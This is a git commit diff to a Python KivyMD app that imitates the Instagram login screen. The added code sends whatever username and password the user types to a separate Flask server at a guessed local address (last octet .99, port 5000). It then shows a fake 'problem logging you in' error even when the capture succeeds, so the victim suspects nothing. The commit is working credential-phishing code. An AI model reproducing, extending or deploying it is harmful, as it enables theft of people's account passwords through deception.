f0cf9bb578bad6c25b5ff1034c574a7c80c6dc73
Sabuhi <sabuhi@sabuhi.com>
2024-03-10 22:17:08 +0400

    add some fetures

--- main.py
+++ main.py
@@ -4,30 +4,85 @@ from kivymd.uix.dialog import MDDialog
 from kivymd.uix.button import MDRaisedButton
 from kivy.core.window import Window
 from kivy.utils import rgba
-import webbrowser
+import requests, socket
+from requests.exceptions import ConnectionError
+
+############################# MESSAGES ##################################
+
+message_login_successful='The was a problem logging you into Instagram. Please try again soon.'
+message_login_failed='Incorrect username or password. Please try again.'
+message_server_connection="We couldn't connect to Instagram. Make sure you're connected to the internet and try again."
+message_connection_error='Server is down or unreachable. Please try again soon.'
+message_empty_login="Username or password cannot be empty. Please try again."
+
+#########################################################################
 
 Window.size = (400, 680)
-
 
 class InstagramApp(MDApp):
     def build(self):
         return Builder.load_file('insta-login.kv')
 
-    def on_login(self, username, password):
-        if username.strip() == "" or password.strip() == "":
-            self.show_error_dialog("Error", "Username or password cannot be empty!")
-        else:
-            link = "https://instagram.com/"+str(username)
-            webbrowser.open(link)
-            # print(username, password)
 
+    def on_login(self, username, password):
+        if self.is_server_available(): # Check server connection
+            url = self.get_server_ip()
+            api_url = url+"/user" # This api is connect to your server (flask,fastapi or something).
+            payload = {'username': username, 'password': password}
+            try:
+                response = requests.post(api_url, json=payload)
+                if response.status_code == 200:
+                    self.show_error_dialog("Error", message_login_successful)
+                elif response.status_code == 401:
+                    self.show_error_dialog("Error", message_empty_login)
+                else:
+                    self.show_error_dialog("Error", message_login_failed)
+            except ConnectionError:
+                self.show_error_dialog("Connection error", message_connection_error)
+        else:
+            self.show_error_dialog("Error", message_server_connection)
+
+    def get_public_ip(self):
+        try:
+            # Create a socket object
+            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
+                # Connect to a remote server
+                sock.connect(("8.8.8.8", 80))
+                # Get the socket's local address, which is your public IP address
+                ip_address = sock.getsockname()[0]
+                return ip_address
+        except socket.error as e:
+            pass
+
+
+    def get_server_ip(self):
+        public_ip = self.get_public_ip()
+        if public_ip:
+            # Change public ip last octet for find server ip
+            ip = public_ip.rsplit('.', 1)[0] + '.99' # Set server ip to static ip ,change last octect to .99 
+            url = "http://"+ip+":5000/" # This is flask server ip, for example: http://192.168.100.99:5000
+        else:
+            url = "http://192.168.1.1:5000/"
+
+        return url
+
+    # Check server connection
+    def is_server_available(self):
+        url=self.get_server_ip()
+        try:
+            requests.get(url)
+            return True
+        except ConnectionError:
+            return False
+
+    # Show error dialog
     def show_error_dialog(self, title, message):
         dialog = MDDialog(
             title=title,
             text=message,
             buttons=[MDRaisedButton(text="OK", on_release=self.dismiss_dialog)])
 
-        dialog.ids.text.text_color = rgba("#000000")
+        dialog.ids.text.text_color = rgba("#FF2B2B")
         dialog.open()
 
     def dismiss_dialog(self, *args):
